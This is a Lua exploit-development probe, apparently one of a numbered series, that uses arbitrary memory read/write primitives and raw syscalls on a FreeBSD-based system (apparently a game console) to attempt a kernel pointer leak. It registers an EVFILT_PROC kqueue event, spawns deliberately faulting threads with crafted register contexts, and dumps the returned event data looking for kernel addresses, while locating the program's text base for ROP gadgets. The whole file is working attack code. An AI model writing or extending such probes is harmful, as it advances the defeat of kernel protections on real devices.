-- CRASH_CLASS: HIGH
-- PROBE 125a: THREADING + EVFILT_PROC KERNEL POINTER LEAK
--
-- Context:
--   80a CONFIRMED: thr_create(430) with CS=0x43 survives on 14.10.
--   119a CONFIRMED: EVFILT_PROC registration works.
--   UNTESTED: combining them — register EVFILT_PROC before thr_create,
--   then read the kevent data after the thread faults.
--   On older FreeBSD, knote event data can contain struct thread * or
--   other kernel pointers in kn_data/kn_fflags.
--
-- Strategy:
--   1. kqueue() to create a kqueue fd
--   2. kevent() to register EVFILT_PROC with NOTE_EXIT on our PID
--   3. thr_create(430) with CS=0x43 and RIP=0 (thread will fault)
--   4. kevent() to poll for events (thread fault → process event)
--   5. Read ALL fields of returned kevent struct for kernel pointers

print("=== PROBE 125a: THREAD + EVFILT_PROC KERNEL POINTER LEAK ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(addr, val)
    return pcall(function() memory.write_dword(addr, val) end)
end
local function wq(addr, val)
    return pcall(function() memory.write_qword(addr, val) end)
end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc_getpid    = make_syscall(20)
local sc_kqueue    = make_syscall(362)
local sc_kevent    = make_syscall(560)  -- FreeBSD kevent (not kevent2)
local sc_thr_create = make_syscall(430)
local sc_thr_self  = make_syscall(432)
local sc_nanosleep = make_syscall(240)
local sc_close     = make_syscall(6)
local sc_mmap      = make_syscall(477)

local ok0, pid = pcall(function() return sc_getpid() end)
local our_pid = to_num(pid)
print("[0] pid=" .. our_pid)

local tid_buf = memory.alloc(8)
zero(tid_buf, 8)
pcall(function() sc_thr_self(uint64(tid_buf)) end)
local main_tid = rq(tid_buf)
print("[0] main_tid=" .. hex(main_tid))

-- Get eboot base for ret gadget
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
local eboot_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[0] eboot=" .. hex(eboot_base))

--------------------------------------------------------------------
-- STEP 1: Create kqueue
--------------------------------------------------------------------
print("")
print("[1] kqueue()...")
local ok_kq, kq_fd = pcall(function() return sc_kqueue() end)
print("[1] kqueue: ok=" .. tostring(ok_kq) .. " fd=" .. hex(kq_fd))
if not ok_kq then
    print("STOP: kqueue failed")
    return
end

--------------------------------------------------------------------
-- STEP 2: Register EVFILT_PROC with multiple event flags
--------------------------------------------------------------------
print("")
print("[2] Registering EVFILT_PROC...")

-- struct kevent on FreeBSD amd64:
--   +0x00: uintptr_t ident   (8 bytes) = PID
--   +0x08: short     filter  (2 bytes) = EVFILT_PROC = -5
--   +0x0A: u_short   flags   (2 bytes) = EV_ADD | EV_ENABLE = 0x0005
--   +0x0C: u_int     fflags  (4 bytes) = NOTE_EXIT|NOTE_FORK|NOTE_EXEC|NOTE_TRACK
--   +0x10: int64_t   data    (8 bytes) = 0
--   +0x18: void*     udata   (8 bytes) = marker
-- Total: 0x20 = 32 bytes

local KEVENT_SIZE = 0x20
local EV_ADD    = 0x0001
local EV_ENABLE = 0x0004
local EV_CLEAR  = 0x0020
local EVFILT_PROC = -5  -- 0xFFFB as u16

-- NOTE flags for EVFILT_PROC
local NOTE_EXIT  = 0x80000000
local NOTE_FORK  = 0x40000000
local NOTE_EXEC  = 0x20000000
local NOTE_TRACK = 0x00000001

local changelist = memory.alloc(KEVENT_SIZE)
zero(changelist, KEVENT_SIZE)

-- ident = our PID
wq(changelist + 0x00, uint64(our_pid))
-- filter = EVFILT_PROC (-5) — stored as short at +0x08
-- flags = EV_ADD|EV_ENABLE|EV_CLEAR — stored as u_short at +0x0A
-- fflags — stored as u_int at +0x0C
-- Pack filter(16bit) + flags(16bit) + fflags(32bit) as a single dword pair
-- filter = 0xFFFB (-5 as u16), flags = 0x0025 (EV_ADD|EV_ENABLE|EV_CLEAR)
wd(changelist + 0x08, 0xFFFB)          -- filter = -5
wd(changelist + 0x08, 0x0025FFFB)      -- filter=-5 (low 16) | flags=EV_ADD|EV_ENABLE|EV_CLEAR (high 16)
wd(changelist + 0x0C, 0x80000000)      -- fflags = NOTE_EXIT
-- data = 0
wq(changelist + 0x10, uint64(0))
-- udata = marker
wq(changelist + 0x18, uint64(0xAAAAAAAA))

-- Also try with NOTE_EXIT|NOTE_FORK|NOTE_EXEC
-- Actually let's just use NOTE_EXIT for simplicity
print("[2] kevent struct: ident=" .. our_pid ..
    " filter=EVFILT_PROC flags=EV_ADD|EV_ENABLE|EV_CLEAR fflags=NOTE_EXIT")

-- Call kevent to register
local eventlist_reg = memory.alloc(KEVENT_SIZE)
zero(eventlist_reg, KEVENT_SIZE)

local ok_reg, rv_reg = pcall(function()
    return sc_kevent(
        kq_fd,                          -- kq
        uint64(changelist),             -- changelist
        uint64(1),                      -- nchanges
        uint64(eventlist_reg),          -- eventlist (for errors)
        uint64(1),                      -- nevents
        uint64(0)                       -- timeout = NULL (don't block)
    )
end)
print("[2] kevent register: ok=" .. tostring(ok_reg) .. " rv=" .. hex(rv_reg))

-- Check if registration returned an event (error?)
if ok_reg then
    local rv_n = to_num(rv_reg)
    if rv_n > 0 then
        print("[2] registration returned " .. rv_n .. " events (check for EV_ERROR):")
        local e_ident = rq(eventlist_reg + 0x00)
        local e_filter_flags = rd(eventlist_reg + 0x08)
        local e_fflags = rd(eventlist_reg + 0x0C)
        local e_data = rq(eventlist_reg + 0x10)
        local e_udata = rq(eventlist_reg + 0x18)
        print("  ident=" .. hex(e_ident) .. " filter_flags=0x" .. string.format("%08X", e_filter_flags or 0)
            .. " fflags=0x" .. string.format("%08X", e_fflags or 0))
        print("  data=" .. hex(e_data) .. " udata=" .. hex(e_udata))
        local flags_val = (e_filter_flags or 0)
        local flags_hi = math.floor(flags_val / 65536) % 65536
        if flags_hi % 2 == 1 then  -- bit 0 of flags = EV_ERROR? Actually EV_ERROR=0x4000
            print("[2] NOTE: check if EV_ERROR (0x4000) is set in flags")
        end
    else
        print("[2] registration OK, 0 events returned (success)")
    end
end

--------------------------------------------------------------------
-- STEP 3: Create thread with CS=0x43 + RIP=0 (will fault → triggers event)
--------------------------------------------------------------------
print("")
print("[3] Creating thread (CS=0x43, RIP=0) to trigger EVFILT_PROC...")

local CTX_SIZE = 0x500
local ctx = memory.alloc(CTX_SIZE)
zero(ctx, CTX_SIZE)

-- Set proper segment registers (proven working from 80a)
wq(ctx + 0x98, uint64(0x43))    -- MC_CS
wq(ctx + 0xB0, uint64(0x3B))    -- MC_SS
wq(ctx + 0xA0, uint64(0x202))   -- MC_RFLAGS
wq(ctx + 0x118, uint64(0x480))  -- MC_LEN
wq(ctx + 0x90, uint64(0))       -- MC_RIP = 0 (will fault)

-- Give it a valid stack on GPU mmap
local ok_mm, stack = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("[3] thread stack mmap: ok=" .. tostring(ok_mm) .. " base=" .. hex(stack))
wq(ctx + 0xA8, stack + 0x3F00)  -- MC_RSP near top of page

local new_tid_buf = memory.alloc(8)
zero(new_tid_buf, 8)

local ok_tc, rv_tc = pcall(function()
    return sc_thr_create(uint64(ctx), uint64(new_tid_buf), uint64(0))
end)
local child_tid = rq(new_tid_buf)
print("[3] thr_create: ok=" .. tostring(ok_tc) .. " rv=" .. hex(rv_tc) .. " tid=" .. hex(child_tid))

-- Wait for thread to fault
local ts = memory.alloc(16)
wq(ts, uint64(0)); wq(ts + 8, uint64(200000000))  -- 200ms
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

print("[3] canary pid=" .. to_num(sc_getpid()))

--------------------------------------------------------------------
-- STEP 4: Poll kevent for EVFILT_PROC events after thread fault
--------------------------------------------------------------------
print("")
print("[4] Polling kevent for EVFILT_PROC events...")

-- Poll with timeout=0 (non-blocking)
local eventlist = memory.alloc(KEVENT_SIZE * 8)  -- room for 8 events
zero(eventlist, KEVENT_SIZE * 8)

-- Create a timeout struct (0 seconds = non-blocking)
local timeout = memory.alloc(16)
wq(timeout, uint64(0))       -- tv_sec = 0
wq(timeout + 8, uint64(0))   -- tv_nsec = 0

local ok_poll, rv_poll = pcall(function()
    return sc_kevent(
        kq_fd,
        uint64(0),                  -- no changes
        uint64(0),
        uint64(eventlist),          -- eventlist
        uint64(8),                  -- nevents = 8
        uint64(timeout)             -- timeout = {0,0}
    )
end)
print("[4] kevent poll: ok=" .. tostring(ok_poll) .. " rv=" .. hex(rv_poll))

local nevents = to_num(rv_poll)
if nevents > 0 and nevents < 100 then
    print("[4] GOT " .. nevents .. " EVENTS!")
    for i = 0, nevents - 1 do
        local base = eventlist + (i * KEVENT_SIZE)
        local e_ident = rq(base + 0x00)
        local e_filter_flags = rd(base + 0x08)
        local e_fflags = rd(base + 0x0C)
        local e_data = rq(base + 0x10)
        local e_udata = rq(base + 0x18)

        print("")
        print("  EVENT[" .. i .. "]:")
        print("    ident  = " .. hex(e_ident))
        print("    filter_flags = 0x" .. string.format("%08X", e_filter_flags or 0))
        print("    fflags = 0x" .. string.format("%08X", e_fflags or 0))
        print("    data   = " .. hex(e_data))
        print("    udata  = " .. hex(e_udata))

        -- Check data for kernel pointers
        if e_data then
            local dh, dl = get_hi_lo(e_data)
            if dh >= 0xFFFF8000 and dh < 0xFFFFFFFF then
                print("    *** KERNEL POINTER IN DATA! ***")
            end
        end

        -- Dump ALL raw bytes of this kevent for analysis
        print("    raw bytes:")
        for off = 0, KEVENT_SIZE - 4, 4 do
            local v = rd(base + off)
            print(string.format("      +0x%02X: 0x%08X", off, v or 0))
        end
    end
else
    print("[4] No events (0 or error)")
    -- Try with a longer timeout
    print("[4] Trying with 500ms timeout...")
    wq(timeout, uint64(0))
    wq(timeout + 8, uint64(500000000))  -- 500ms

    zero(eventlist, KEVENT_SIZE * 8)
    local ok_p2, rv_p2 = pcall(function()
        return sc_kevent(
            kq_fd,
            uint64(0), uint64(0),
            uint64(eventlist), uint64(8),
            uint64(timeout)
        )
    end)
    print("[4] kevent poll 2: ok=" .. tostring(ok_p2) .. " rv=" .. hex(rv_p2))

    local n2 = to_num(rv_p2)
    if n2 > 0 and n2 < 100 then
        print("[4] GOT " .. n2 .. " EVENTS on retry!")
        for i = 0, n2 - 1 do
            local base = eventlist + (i * KEVENT_SIZE)
            print("  EVENT[" .. i .. "]:")
            for off = 0, KEVENT_SIZE - 4, 4 do
                local v = rd(base + off)
                print(string.format("    +0x%02X: 0x%08X", off, v or 0))
            end
            local e_data = rq(base + 0x10)
            if e_data then
                local dh, dl = get_hi_lo(e_data)
                if dh >= 0xFFFF8000 and dh < 0xFFFFFFFF then
                    print("    *** KERNEL POINTER IN DATA! ***")
                end
            end
        end
    else
        print("[4] Still no events")
    end
end

--------------------------------------------------------------------
-- STEP 5: Also try creating MULTIPLE threads and polling after each
--------------------------------------------------------------------
print("")
print("[5] Creating 3 more threads for more events...")
for i = 1, 3 do
    local ctx2 = memory.alloc(CTX_SIZE)
    zero(ctx2, CTX_SIZE)
    wq(ctx2 + 0x98, uint64(0x43))
    wq(ctx2 + 0xB0, uint64(0x3B))
    wq(ctx2 + 0xA0, uint64(0x202))
    wq(ctx2 + 0x118, uint64(0x480))
    wq(ctx2 + 0x90, uint64(0))
    wq(ctx2 + 0xA8, stack + 0x3F00)

    local ok_t, rv_t = pcall(function()
        return sc_thr_create(uint64(ctx2), uint64(new_tid_buf), uint64(0))
    end)
    local tid = rq(new_tid_buf)
    print("[5] thread " .. i .. ": tid=" .. hex(tid))
end

-- Wait and poll
wq(ts, uint64(0)); wq(ts + 8, uint64(300000000))
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

zero(eventlist, KEVENT_SIZE * 8)
wq(timeout, uint64(0)); wq(timeout + 8, uint64(0))
local ok_p3, rv_p3 = pcall(function()
    return sc_kevent(
        kq_fd, uint64(0), uint64(0),
        uint64(eventlist), uint64(8), uint64(timeout)
    )
end)
print("[5] final poll: ok=" .. tostring(ok_p3) .. " rv=" .. hex(rv_p3))
local n3 = to_num(rv_p3)
if n3 > 0 and n3 < 100 then
    print("[5] GOT " .. n3 .. " EVENTS!")
    for i = 0, n3 - 1 do
        local base = eventlist + (i * KEVENT_SIZE)
        print("  EVENT[" .. i .. "]:")
        for off = 0, KEVENT_SIZE - 4, 4 do
            local v = rd(base + off)
            print(string.format("    +0x%02X: 0x%08X", off, v or 0))
        end
    end
end

-- Cleanup
pcall(function() sc_close(kq_fd) end)

print("")
print("[FINAL] canary pid=" .. to_num(sc_getpid()))
print("=== PROBE 125a COMPLETE ===")
